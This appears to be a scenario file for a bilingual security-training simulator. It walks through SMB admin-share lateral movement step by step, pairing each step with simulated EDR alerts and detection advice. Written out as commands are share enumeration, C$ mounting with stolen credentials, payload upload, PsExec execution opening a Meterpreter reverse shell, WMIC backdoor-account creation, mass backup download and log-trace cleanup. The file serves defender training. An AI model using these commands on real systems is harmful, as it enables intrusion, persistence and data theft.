@@ -1,0 +1,276 @@
+{
+  "id": "T1021.002",
+  "title": "SMB/Windows 관리 공유 시뮬레이션",
+  "titleEn": "SMB/Windows Admin Shares Lateral Movement Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "정찰", "labelEn": "Recon", "icon": "🔍" },
+    { "label": "공격", "labelEn": "Attack", "icon": "⚔️" },
+    { "label": "침투", "labelEn": "Breach", "icon": "💀" },
+    { "label": "완료", "labelEn": "Complete", "icon": "🏁" }
+  ],
+  "topoNodes": [
+    { "id": "attacker", "label": "Attacker PC", "icon": "💻" },
+    { "id": "dc01", "label": "DC01 (AD)", "icon": "🏰" },
+    { "id": "sql01", "label": "SQL01 Server", "icon": "🗄️" },
+    { "id": "backup01", "label": "BACKUP01", "icon": "💾" },
+    { "id": "siem", "label": "SIEM / EDR", "icon": "🛡️" }
+  ],
+  "topoEdges": [
+    { "from": "attacker", "to": "dc01", "label": "SMB C$ / PsExec", "activeStep": [0, 1, 2, 3, 4] },
+    { "from": "attacker", "to": "sql01", "label": "WMI Backdoor", "activeStep": [5] },
+    { "from": "attacker", "to": "backup01", "label": "SMB Data Exfil", "activeStep": [6] },
+    { "from": "attacker", "to": "siem", "label": "Alert", "activeStep": [1, 3, 4, 5, 6] },
+    { "from": "dc01", "to": "siem", "label": "EDR Alert", "activeStep": [2, 3, 4] }
+  ],
+  "desktopIcons": [
+    { "name": "net.exe", "icon": "🌐", "alertOnStep": 0 },
+    { "name": "psexec.exe", "icon": "⚡", "alertOnStep": 4 },
+    { "name": "wmic.exe", "icon": "🔧", "alertOnStep": 5 },
+    { "name": "smbclient", "icon": "📦", "alertOnStep": 6 }
+  ],
+  "steps": [
+    {
+      "cmd": "net view \\\\DC01 /all",
+      "out": "Shared resources at \\\\DC01.{companyName}.local\n\nShare name   Type  Remark\n-----------  ----  ------\nADMIN$       Disk  Remote Admin\nC$           Disk  Default share\nD$           Disk  Default share\nHR_Data      Disk  HR Department\nIT_Shared    Disk  IT Team Share\nNETLOGON     Disk  Logon server share\nSYSVOL       Disk  Logon server share\nThe command completed successfully.",
+      "def": "[SIEM] SMB share enumeration on DC01 from PC-{userName}",
+      "defAction": "Process: net.exe\nTarget: \\\\DC01\nShares Found: 7 (including admin shares)\nUser: {companyName}\\{userName}\nRisk Level: Medium\nAction: Monitor for admin share access attempts",
+      "desc": "DC01의 모든 SMB 공유(숨김 공유 포함)를 열거합니다. ADMIN$, C$는 관리자만 접근 가능한 기본 관리 공유입니다.",
+      "descEn": "Enumerates all SMB shares on DC01 (including hidden shares). ADMIN$ and C$ are default admin shares accessible only to administrators.",
+      "stepTitle": "SMB 공유 열거",
+      "stepTitleEn": "SMB Share Enumeration",
+      "feynman": "건물 안내판을 보며 어떤 사무실이 있는지 확인하는 것과 같아요. C$, ADMIN$은 '관리자 전용 비밀 통로'이고, HR_Data, IT_Shared는 일반 공유 폴더입니다.",
+      "feynmanEn": "It's like looking at a building directory to see what offices exist. C$ and ADMIN$ are 'admin-only secret passages', while HR_Data and IT_Shared are regular shared folders.",
+      "expert": "net view /all로 숨김 관리 공유($ 접미사)를 포함한 전체 공유를 열거합니다. ADMIN$은 %SystemRoot%에 매핑되고, C$는 C: 드라이브 전체입니다. MITRE T1135 (Network Share Discovery)에 해당합니다. SMB 열거는 Event ID 5140 (Network Share Was Accessed)에 기록됩니다.",
+      "expertEn": "net view /all enumerates all shares including hidden admin shares ($ suffix). ADMIN$ maps to %SystemRoot%, C$ provides full C: drive access. Maps to MITRE T1135 (Network Share Discovery). SMB enumeration is logged in Event ID 5140.",
+      "defTooltip": "Windows Event ID 5140 (Network Share Was Accessed)에서 $로 끝나는 공유 접근을 감시하세요. 비관리자 계정의 ADMIN$/C$ 접근 시도는 즉시 조사 대상입니다.",
+      "defTooltipEn": "Monitor Event ID 5140 for share names ending with $. ADMIN$/C$ access attempts from non-admin accounts require immediate investigation.",
+      "hackerLog": {
+        "title": "DC01 SMB 공유 목록",
+        "lines": [
+          { "text": "net view \\\\DC01 /all", "desc": "DC01의 모든 공유(숨김 포함) 열거" },
+          { "text": "ADMIN$  Disk  Remote Admin", "desc": "관리자 전용 시스템 디렉토리 공유" },
+          { "text": "C$  Disk  Default share", "desc": "C: 드라이브 전체에 대한 관리 공유" }
+        ]
+      },
+      "terms": [
+        { "term": "Admin Shares (C$, ADMIN$)", "desc": "Windows가 기본 생성하는 관리자 전용 숨김 네트워크 공유입니다." },
+        { "term": "SMB (Server Message Block)", "desc": "Windows 파일 공유에 사용되는 네트워크 프로토콜로, 포트 445를 사용합니다." },
+        { "term": "SYSVOL", "desc": "도메인 컨트롤러의 그룹 정책과 로그온 스크립트가 저장되는 공유입니다." }
+      ]
+    },
+    {
+      "cmd": "net use \\\\DC01\\C$ /user:{companyName}\\admin.jkim Admin@2024",
+      "out": "The command completed successfully.",
+      "def": "[EDR] CRITICAL: Admin share (C$) mounted on DC01 with admin credentials",
+      "defAction": "Source: PC-{userName} (192.168.1.105)\nTarget: \\\\DC01\\C$\nAccount: admin.jkim (Domain Admin)\nRisk Level: Critical\nEvent ID: 5140 (Network share accessed)\nAction: Disconnect share, investigate credential source",
+      "desc": "탈취한 관리자 계정으로 DC01의 C$ 관리 공유에 접속합니다. 이제 도메인 컨트롤러의 전체 파일 시스템에 원격 접근이 가능합니다.",
+      "descEn": "Connects to DC01's C$ admin share with stolen admin credentials. The entire file system of the domain controller is now remotely accessible.",
+      "stepTitle": "C$ 관리 공유 마운트",
+      "stepTitleEn": "C$ Admin Share Mount",
+      "feynman": "마스터키로 건물의 모든 방을 열 수 있는 것처럼, 관리자 계정으로 DC01의 C: 드라이브 전체를 네트워크를 통해 내 폴더처럼 접근할 수 있게 됩니다.",
+      "feynmanEn": "Like using a master key that opens every room in the building, the admin account lets you access DC01's entire C: drive over the network as if it were your own folder.",
+      "expert": "net use로 C$ 관리 공유에 인증된 SMB 세션을 설정합니다. NTLM 또는 Kerberos 인증이 사용되며, Event ID 4624 (Logon Type 3 - Network)이 생성됩니다. MITRE T1021.002의 핵심 단계로, C$는 SYSTEM 드라이브 전체를 노출합니다. UAC remote restrictions로 로컬 관리자 계정의 원격 C$ 접근을 제한할 수 있습니다.",
+      "expertEn": "net use establishes an authenticated SMB session to C$ admin share. NTLM or Kerberos authentication is used, generating Event ID 4624 (Logon Type 3). Core step of MITRE T1021.002, C$ exposes the entire SYSTEM drive. UAC remote restrictions can limit remote C$ access for local admin accounts.",
+      "defTooltip": "Windows Event ID 5140 (ShareName: C$)과 Event ID 4624 (Logon Type 3)를 상관분석하세요. 비정상 소스에서의 C$ 접근은 래터럴 무브먼트 징후입니다.",
+      "defTooltipEn": "Correlate Event ID 5140 (ShareName: C$) with Event ID 4624 (Logon Type 3). C$ access from abnormal sources indicates lateral movement.",
+      "hackerLog": {
+        "title": "DC01 C$ 공유 접속",
+        "lines": [
+          { "text": "net use \\\\DC01\\C$ /user:admin.jkim Admin@2024", "desc": "탈취한 관리자 자격증명으로 C$ 공유 마운트" },
+          { "text": "The command completed successfully.", "desc": "DC01 전체 파일 시스템에 원격 접근 확보" }
+        ]
+      },
+      "terms": [
+        { "term": "net use", "desc": "네트워크 공유에 연결하거나 해제하는 Windows 명령입니다." },
+        { "term": "Logon Type 3", "desc": "Windows 이벤트 로그에서 네트워크(SMB) 인증을 나타내는 로그온 유형입니다." },
+        { "term": "UAC Remote Restrictions", "desc": "원격 관리 공유 접근 시 로컬 관리자 토큰을 필터링하는 보안 기능입니다." }
+      ]
+    },
+    {
+      "cmd": "dir \\\\DC01\\C$\\Users\\Administrator\\Desktop",
+      "out": " Volume in drive \\\\DC01\\C$ has no label.\n Directory of \\\\DC01\\C$\\Users\\Administrator\\Desktop\n\n03/01/2026  06:00 AM    <DIR>          .\n03/01/2026  06:00 AM    <DIR>          ..\n02/15/2026  03:00 PM            12,288 backup-script.ps1\n01/20/2026  10:00 AM             8,192 domain-config.xlsx\n02/28/2026  05:00 PM             4,096 ad-maintenance.bat\n               3 File(s)         24,576 bytes",
+      "def": "[EDR] CRITICAL: DC01 Administrator desktop accessed via admin share",
+      "defAction": "Path: \\\\DC01\\C$\\Users\\Administrator\\Desktop\nFiles Accessed: backup-script.ps1, domain-config.xlsx, ad-maintenance.bat\nAccess Via: C$ share (admin.jkim)\nRisk Level: Critical\nAction: Full DC01 access confirmed - escalate to P1 incident",
+      "desc": "관리 공유를 통해 DC01 관리자의 바탕화면에 접근합니다. 백업 스크립트, 도메인 설정 파일 등 핵심 관리 파일을 확인합니다.",
+      "descEn": "Accesses the DC01 administrator's desktop via admin share. Finds critical management files including backup scripts and domain configuration.",
+      "stepTitle": "관리자 파일 탐색",
+      "stepTitleEn": "Admin File Browsing",
+      "feynman": "마스터키로 사장실에 들어가 책상 위의 문서를 뒤지는 것과 같아요. 백업 스크립트와 도메인 설정 파일에는 더 많은 비밀이 담겨있을 수 있습니다.",
+      "feynmanEn": "It's like entering the CEO's office with a master key and rifling through documents on the desk. Backup scripts and domain config files may contain even more secrets.",
+      "expert": "SMB 관리 공유를 통한 파일 시스템 탐색은 MITRE T1083 (File and Directory Discovery)에 해당합니다. backup-script.ps1에는 하드코딩된 자격증명이, domain-config.xlsx에는 네트워크 구성이 포함될 수 있습니다. Event ID 5145 (Detailed File Share Audit)로 개별 파일 접근을 추적할 수 있습니다.",
+      "expertEn": "File system browsing via SMB admin shares maps to MITRE T1083 (File and Directory Discovery). backup-script.ps1 may contain hardcoded credentials, domain-config.xlsx may have network configurations. Event ID 5145 (Detailed File Share) tracks individual file access.",
+      "defTooltip": "Windows Event ID 5145 (Detailed File Share)로 C$를 통한 개별 파일 접근을 추적하세요. 특히 Administrator 프로필 경로 접근은 고위험 활동입니다.",
+      "defTooltipEn": "Track individual file access via C$ using Event ID 5145 (Detailed File Share). Access to Administrator profile paths is high-risk activity.",
+      "hackerLog": {
+        "title": "DC01 관리자 바탕화면 탐색",
+        "lines": [
+          { "text": "dir \\\\DC01\\C$\\Users\\Administrator\\Desktop", "desc": "관리 공유로 관리자 바탕화면 파일 목록 조회" },
+          { "text": "backup-script.ps1", "desc": "백업 스크립트 - 자격증명 하드코딩 가능성" },
+          { "text": "domain-config.xlsx", "desc": "도메인 설정 파일 - 네트워크 구성 정보" }
+        ]
+      },
+      "terms": [
+        { "term": "Event ID 5145", "desc": "SMB 공유에서 개별 파일/폴더 접근을 상세히 기록하는 Windows 보안 이벤트입니다." },
+        { "term": "Hardcoded Credentials", "desc": "스크립트나 설정 파일에 평문으로 저장된 비밀번호를 말합니다." }
+      ]
+    },
+    {
+      "cmd": "copy payload.exe \\\\DC01\\C$\\Windows\\Temp\\svchost_update.exe",
+      "out": "        1 file(s) copied.",
+      "def": "[EDR] CRITICAL: Suspicious file uploaded to DC01 via admin share",
+      "defAction": "File: svchost_update.exe (masquerading as system file)\nDestination: \\\\DC01\\C$\\Windows\\Temp\\\nHash: 5a3f2b1c4d6e7f8a9b0c1d2e3f4a5b6c\nSigner: UNSIGNED\nRisk Level: Critical\nAction: Delete file, scan DC01 for compromise",
+      "desc": "악성 페이로드를 관리 공유를 통해 DC01에 업로드합니다. svchost_update.exe로 위장하여 정상 파일처럼 보이게 합니다.",
+      "descEn": "Uploads a malicious payload to DC01 via admin share. Disguised as svchost_update.exe to appear as a legitimate file.",
+      "stepTitle": "페이로드 업로드",
+      "stepTitleEn": "Payload Upload",
+      "feynman": "택배 기사가 정상 택배인 척하면서 회사 서버실에 도청 장치를 놓고 가는 것과 같아요. svchost_update.exe라는 이름으로 위장해서 정상 파일처럼 보이게 합니다.",
+      "feynmanEn": "It's like a delivery person pretending to drop off a normal package while secretly planting a listening device in the server room. Disguised as svchost_update.exe to look legitimate.",
+      "expert": "C$ 관리 공유를 통한 페이로드 업로드는 MITRE T1570 (Lateral Tool Transfer)에 해당합니다. %SystemRoot%\\Temp에 svchost 위장 파일을 배치하는 것은 T1036.005 (Masquerading: Match Legitimate Name or Location)입니다. EDR은 서명되지 않은 바이너리의 Temp 폴더 생성을 탐지해야 합니다.",
+      "expertEn": "Payload upload via C$ admin share maps to MITRE T1570 (Lateral Tool Transfer). Placing a svchost-disguised file in %SystemRoot%\\Temp is T1036.005 (Masquerading). EDR should detect unsigned binary creation in Temp folders.",
+      "defTooltip": "Sysmon Event ID 11 (File Created)로 C:\\Windows\\Temp\\에 생성되는 .exe 파일을 감시하세요. 서명되지 않은(unsigned) 실행 파일이 SMB를 통해 생성되면 즉시 격리 조치하세요.",
+      "defTooltipEn": "Monitor .exe creation in C:\\Windows\\Temp\\ via Sysmon Event ID 11 (File Created). Quarantine unsigned executables created via SMB immediately.",
+      "hackerLog": {
+        "title": "DC01에 악성 파일 업로드",
+        "lines": [
+          { "text": "copy payload.exe \\\\DC01\\C$\\Windows\\Temp\\svchost_update.exe", "desc": "관리 공유로 위장된 악성 파일 업로드" },
+          { "text": "1 file(s) copied.", "desc": "DC01에 페이로드 배치 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Masquerading", "desc": "악성 파일을 정상 시스템 파일 이름으로 위장하는 기법입니다." },
+        { "term": "Lateral Tool Transfer (T1570)", "desc": "네트워크 내 다른 시스템으로 공격 도구를 전송하는 기법입니다." },
+        { "term": "svchost.exe", "desc": "Windows 서비스를 호스팅하는 정상 시스템 프로세스로, 공격자가 자주 위장합니다." }
+      ]
+    },
+    {
+      "cmd": "psexec.exe \\\\DC01 -u {companyName}\\admin.jkim -p Admin@2024 -accepteula cmd.exe /c C:\\Windows\\Temp\\svchost_update.exe",
+      "out": "PsExec v2.43 - Execute processes remotely\nCopyright (C) 2001-2023 Mark Russinovich\nSysinternals - www.sysinternals.com\n\nConnecting to DC01...\nStarting PSEXESVC service on DC01...\nConnecting with PsExec service on DC01...\nStarting cmd.exe on DC01...\n\n[*] Payload executed successfully on DC01\n[*] Meterpreter session 2 opened (10.0.0.50:4443 -> 192.168.1.10:49321)\n\ncmd.exe exited on DC01 with error code 0.",
+      "def": "[EDR] CRITICAL: PsExec remote execution on Domain Controller",
+      "defAction": "Tool: PsExec v2.43\nSource: PC-{userName}\nTarget: DC01\nService: PSEXESVC installed\nCommand: svchost_update.exe (malware)\nOutbound Connection: 10.0.0.50:4443\nRisk Level: Critical\nAction: ISOLATE DC01, kill PSEXESVC, incident response P1",
+      "desc": "PsExec으로 DC01에서 원격 명령을 실행합니다. PSEXESVC 서비스를 설치하고 악성 파일을 실행하여 리버스 쉘을 연결합니다.",
+      "descEn": "Executes remote commands on DC01 using PsExec. Installs the PSEXESVC service and runs the malicious file to establish a reverse shell.",
+      "stepTitle": "PsExec 원격 실행",
+      "stepTitleEn": "PsExec Remote Exec",
+      "feynman": "원격으로 로봇 팔을 조종해서 서버실의 버튼을 누르는 것과 같아요. PsExec은 DC01에 임시 도우미(PSEXESVC)를 설치하고, 그 도우미가 악성 프로그램을 대신 실행합니다.",
+      "feynmanEn": "It's like remotely controlling a robotic arm to press buttons in the server room. PsExec installs a temporary helper (PSEXESVC) on DC01, which runs the malicious program on its behalf.",
+      "expert": "PsExec v2.43은 SMB 인증 후 PSEXESVC 서비스를 설치하여 원격 명령을 실행합니다. MITRE T1569.002 (System Services: Service Execution)에 해당합니다. Meterpreter 리버스 쉘(10.0.0.50:4443)이 설정되어 C2 채널이 확립됩니다. PSEXESVC 서비스 설치는 Event ID 7045 (Service Installed)에 기록됩니다.",
+      "expertEn": "PsExec v2.43 installs PSEXESVC service via SMB authentication for remote command execution. Maps to MITRE T1569.002 (Service Execution). Meterpreter reverse shell (10.0.0.50:4443) establishes a C2 channel. PSEXESVC installation is logged in Event ID 7045 (Service Installed).",
+      "defTooltip": "Windows Event ID 7045 (Service Installed)에서 PSEXESVC 서비스 설치를 감시하세요. Sysmon Event ID 1로 psexec.exe 실행을 탐지하고, Event ID 3으로 아웃바운드 C2 연결을 추적하세요.",
+      "defTooltipEn": "Monitor Event ID 7045 for PSEXESVC service installation. Detect psexec.exe execution via Sysmon Event ID 1, and track outbound C2 connections via Event ID 3.",
+      "hackerLog": {
+        "title": "PsExec으로 DC01 원격 실행",
+        "lines": [
+          { "text": "psexec.exe \\\\DC01 -u admin.jkim -p Admin@2024", "desc": "PsExec으로 DC01에 SMB 인증 후 원격 연결" },
+          { "text": "Starting PSEXESVC service on DC01...", "desc": "원격 실행을 위한 서비스 자동 설치" },
+          { "text": "Meterpreter session 2 opened (10.0.0.50:4443)", "desc": "리버스 쉘 C2 채널 확립 - DC01 장악" }
+        ]
+      },
+      "terms": [
+        { "term": "PsExec", "desc": "Sysinternals의 원격 명령 실행 도구로, SMB를 통해 다른 시스템에서 프로세스를 실행합니다." },
+        { "term": "PSEXESVC", "desc": "PsExec이 대상 시스템에 설치하는 임시 서비스입니다." },
+        { "term": "Meterpreter", "desc": "Metasploit의 고급 페이로드로, 메모리에서 실행되는 원격 제어 도구입니다." }
+      ]
+    },
+    {
+      "cmd": "wmic /node:SQL01 /user:{companyName}\\admin.jkim /password:Admin@2024 process call create \"cmd.exe /c net user backdoor P@ssw0rd123! /add && net localgroup Administrators backdoor /add\"",
+      "out": "Executing (Win32_Process)->Create()\nMethod execution successful.\nOut Parameters:\ninstance of __PARAMETERS\n{\n        ProcessId = 8824;\n        ReturnValue = 0;\n};",
+      "def": "[EDR] CRITICAL: WMI remote process creation on SQL01 - backdoor account created",
+      "defAction": "Tool: WMIC\nTarget: SQL01 (192.168.1.20)\nProcess Created: cmd.exe (PID: 8824)\nCommands:\n  - net user backdoor /add\n  - net localgroup Administrators backdoor /add\nRisk Level: Critical\nAction: Remove backdoor account, audit all servers for unauthorized accounts",
+      "desc": "WMI를 통해 SQL01에서 원격으로 백도어 계정을 생성하고 관리자 그룹에 추가합니다. SMB 인증을 사용하므로 추가 도구가 필요 없습니다.",
+      "descEn": "Remotely creates a backdoor account on SQL01 via WMI and adds it to the Administrators group. Uses SMB authentication, requiring no additional tools.",
+      "stepTitle": "WMI 백도어 생성",
+      "stepTitleEn": "WMI Backdoor Creation",
+      "feynman": "전화로 직원에게 지시해서 새로운 출입 카드를 만들게 하는 것과 같아요. WMI라는 '원격 전화 시스템'으로 SQL01에 명령을 내려 비밀 계정을 만들고 관리자 권한을 부여합니다.",
+      "feynmanEn": "It's like calling an employee and instructing them to create a new access card. Using WMI as a 'remote phone system', commands are sent to SQL01 to create a secret account with admin privileges.",
+      "expert": "WMIC(Windows Management Instrumentation Command-line)는 DCOM/RPC를 통한 원격 프로세스 생성을 지원합니다. MITRE T1047 (Windows Management Instrumentation)과 T1136.001 (Create Account: Local Account)이 결합됩니다. WMI는 PsExec과 달리 서비스를 설치하지 않아 탐지가 어렵습니다. Event ID 4688 (Process Creation)에서 cmd.exe 자식 프로세스로 기록됩니다.",
+      "expertEn": "WMIC supports remote process creation via DCOM/RPC. Combines MITRE T1047 (WMI) with T1136.001 (Create Local Account). Unlike PsExec, WMI doesn't install services, making detection harder. Logged as cmd.exe child process in Event ID 4688 (Process Creation).",
+      "defTooltip": "WMI 원격 프로세스 생성은 Event ID 4688에서 WmiPrvSE.exe → cmd.exe 프로세스 체인으로 나타납니다. Event ID 4720 (User Account Created)과 4732 (Member Added to Group)도 함께 확인하세요.",
+      "defTooltipEn": "WMI remote process creation appears as WmiPrvSE.exe -> cmd.exe process chain in Event ID 4688. Also check Event ID 4720 (User Created) and 4732 (Member Added to Group).",
+      "hackerLog": {
+        "title": "SQL01 WMI 원격 백도어",
+        "lines": [
+          { "text": "wmic /node:SQL01 process call create", "desc": "WMI로 SQL01에서 원격 프로세스 생성" },
+          { "text": "net user backdoor P@ssw0rd123! /add", "desc": "백도어 로컬 계정 생성" },
+          { "text": "net localgroup Administrators backdoor /add", "desc": "백도어 계정에 관리자 권한 부여" }
+        ]
+      },
+      "terms": [
+        { "term": "WMI (Windows Management Instrumentation)", "desc": "Windows 시스템을 원격으로 관리하는 인프라로, 프로세스 생성도 가능합니다." },
+        { "term": "DCOM/RPC", "desc": "분산 컴퓨팅을 위한 통신 프로토콜로, WMI 원격 실행에 사용됩니다." },
+        { "term": "WmiPrvSE.exe", "desc": "WMI Provider Host 프로세스로, WMI 요청을 처리하는 시스템 서비스입니다." }
+      ]
+    },
+    {
+      "cmd": "smbclient //BACKUP01/{companyName} -U admin.jkim%Admin@2024 -c \"recurse ON; prompt OFF; mget *\"",
+      "out": "Try \"help\" to get a list of possible commands.\nsmb: \\> recurse ON\nsmb: \\> prompt OFF\nsmb: \\> mget *\ngetting file \\full-backup-20260228.bak (28543.2 kb/s) (average 28543.2 kb/s)\ngetting file \\db-backup-20260301.sql (15234.8 kb/s) (average 21889.0 kb/s)\ngetting file \\config-backup.tar.gz (8912.4 kb/s) (average 17563.5 kb/s)\ngetting file \\ad-backup-20260228.zip (32100.6 kb/s) (average 21197.8 kb/s)\n\n4 files downloaded, total size: 856 MB",
+      "def": "[EDR] CRITICAL: Mass file exfiltration from BACKUP01 via SMB",
+      "defAction": "Source: BACKUP01 (192.168.1.50)\nDestination: PC-{userName} (192.168.1.105)\nAccount: admin.jkim\nFiles Downloaded: 4 (856 MB total)\nContent: Full backups, DB dumps, AD backup\nRisk Level: Critical\nAction: Full data breach investigation, notify CISO",
+      "desc": "SMB 공유를 통해 BACKUP01에서 전체 백업 파일을 대량으로 다운로드합니다. AD 백업, DB 백업 등 856MB의 핵심 데이터를 탈취합니다.",
+      "descEn": "Mass-downloads backup files from BACKUP01 via SMB share. Exfiltrates 856MB of critical data including AD backup and DB backup.",
+      "stepTitle": "백업 데이터 탈취",
+      "stepTitleEn": "Backup Data Exfil",
+      "feynman": "회사 금고에서 모든 중요 서류를 복사해 가방에 담아가는 것과 같아요. 전체 백업 파일, 데이터베이스, AD 설정까지 856MB나 되는 핵심 데이터를 가져갑니다.",
+      "feynmanEn": "It's like copying all important documents from the company safe into your bag. 856MB of critical data including full backups, database dumps, and AD configurations are taken.",
+      "expert": "smbclient의 recurse ON + mget *는 재귀적 파일 대량 다운로드를 수행합니다. MITRE T1039 (Data from Network Shared Drive)와 T1005 (Data from Local System)에 해당합니다. AD 백업(NTDS.dit)에는 모든 도메인 해시가 포함되어 있어 완전한 도메인 침해입니다. NDR에서 856MB SMB 전송 볼륨을 탐지해야 합니다.",
+      "expertEn": "smbclient's recurse ON + mget * performs recursive mass file download. Maps to MITRE T1039 (Data from Network Shared Drive). AD backup (NTDS.dit) contains all domain hashes, constituting complete domain compromise. NDR should detect the 856MB SMB transfer volume.",
+      "defTooltip": "NDR에서 SMB 트래픽의 비정상적 볼륨(수백 MB 이상)을 모니터링하세요. Event ID 5145로 대량 파일 접근 패턴을 탐지하고, 백업 서버 접근은 화이트리스트 기반으로 관리하세요.",
+      "defTooltipEn": "Monitor abnormal SMB traffic volume (100+ MB) via NDR. Detect mass file access patterns via Event ID 5145. Manage backup server access via whitelisting.",
+      "hackerLog": {
+        "title": "BACKUP01 데이터 대량 탈취",
+        "lines": [
+          { "text": "smbclient //BACKUP01 -U admin.jkim%Admin@2024", "desc": "백업 서버에 SMB 인증 접속" },
+          { "text": "recurse ON; prompt OFF; mget *", "desc": "모든 파일을 재귀적으로 자동 다운로드" },
+          { "text": "4 files downloaded, total size: 856 MB", "desc": "AD/DB 백업 포함 856MB 탈취 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "smbclient", "desc": "Linux에서 SMB/CIFS 서버에 접속하는 명령줄 도구입니다." },
+        { "term": "NTDS.dit", "desc": "Active Directory 데이터베이스로, 모든 사용자의 비밀번호 해시가 저장됩니다." },
+        { "term": "Data Exfiltration", "desc": "공격자가 탈취한 데이터를 외부로 전송하는 행위입니다." }
+      ]
+    },
+    {
+      "cmd": "net use * /delete /y",
+      "out": "You have these remote connections:\n\n    \\\\DC01\\C$\n    \\\\BACKUP01\\{companyName}\n\nContinuing will cancel the connections.\n\nThe command completed successfully.",
+      "def": "[EDR] SMB sessions terminated - anti-forensics cleanup",
+      "defAction": "Connections Closed:\n  - \\\\DC01\\C$\n  - \\\\BACKUP01\\{companyName}\nRisk Level: High\nAction: SMB session logs preserved, correlate with previous activity",
+      "desc": "모든 원격 SMB 연결을 해제합니다. 흔적을 줄이기 위한 정리 작업이지만, 이벤트 로그에는 연결 기록이 남아있습니다.",
+      "descEn": "Disconnects all remote SMB connections. This is cleanup to reduce traces, but connection records remain in event logs.",
+      "stepTitle": "SMB 연결 정리",
+      "stepTitleEn": "SMB Session Cleanup",
+      "feynman": "범행 후 장갑을 벗고 도구를 치우는 것과 같아요. SMB 네트워크 연결을 모두 끊어 흔적을 줄이려 하지만, 이미 CCTV(이벤트 로그)에 모든 것이 기록되어 있습니다.",
+      "feynmanEn": "It's like removing gloves and cleaning up tools after a crime. All SMB connections are disconnected to reduce traces, but everything is already recorded on CCTV (event logs).",
+      "expert": "net use * /delete /y로 모든 SMB 세션을 일괄 해제하는 안티포렌식 기법입니다. MITRE T1070 (Indicator Removal on Host)에 해당합니다. 그러나 Event ID 5140/5145, 4624/4634는 이미 기록되어 있으며, 네트워크 레벨 로그(NDR, 방화벽)도 남아있습니다. 공격 타임라인 재구성이 가능합니다.",
+      "expertEn": "net use * /delete /y bulk-disconnects all SMB sessions as anti-forensics. Maps to MITRE T1070 (Indicator Removal). However, Event IDs 5140/5145, 4624/4634 are already logged, along with network-level logs (NDR, firewall). Attack timeline reconstruction remains possible.",
+      "defTooltip": "SMB 세션 종료 자체는 정상이지만, 이전 이벤트(5140, 5145, 4624)와 상관분석하면 전체 공격 타임라인을 재구성할 수 있습니다. 로그 보존 정책을 최소 90일 이상 설정하세요.",
+      "defTooltipEn": "SMB session termination itself is normal, but correlating with prior events (5140, 5145, 4624) reconstructs the full attack timeline. Set log retention policy to at least 90 days.",
+      "hackerLog": {
+        "title": "SMB 연결 해제 및 정리",
+        "lines": [
+          { "text": "net use * /delete /y", "desc": "모든 원격 SMB 연결 강제 해제" },
+          { "text": "\\\\DC01\\C$", "desc": "DC01 관리 공유 연결 해제" },
+          { "text": "\\\\BACKUP01\\{companyName}", "desc": "백업 서버 공유 연결 해제" }
+        ]
+      },
+      "terms": [
+        { "term": "Anti-Forensics", "desc": "디지털 포렌식 분석을 방해하기 위한 흔적 제거 기법입니다." },
+        { "term": "Event ID 4634", "desc": "Windows 로그오프 이벤트로, SMB 세션 종료 시 기록됩니다." },
+        { "term": "NDR (Network Detection and Response)", "desc": "네트워크 트래픽을 분석하여 위협을 탐지하는 보안 솔루션입니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "cmd.exe (PID: 3400)", "depth": 1, "alert": false, "minStep": 0 },
+    { "name": "net.exe (share enum)", "depth": 2, "alert": false, "minStep": 0 },
+    { "name": "net.exe (use C$)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "copy (payload upload)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "psexec.exe (PID: 6200)", "depth": 2, "alert": true, "minStep": 4 },
+    { "name": "[DC01] PSEXESVC -> svchost_update.exe", "depth": 3, "alert": true, "minStep": 4 },
+    { "name": "wmic.exe (remote exec)", "depth": 2, "alert": true, "minStep": 5 },
+    { "name": "[SQL01] cmd.exe (PID: 8824)", "depth": 3, "alert": true, "minStep": 5 },
+    { "name": "smbclient (data exfil)", "depth": 2, "alert": true, "minStep": 6 },
+    { "name": "net.exe (cleanup)", "depth": 2, "alert": false, "minStep": 7 }
+  ]
+}
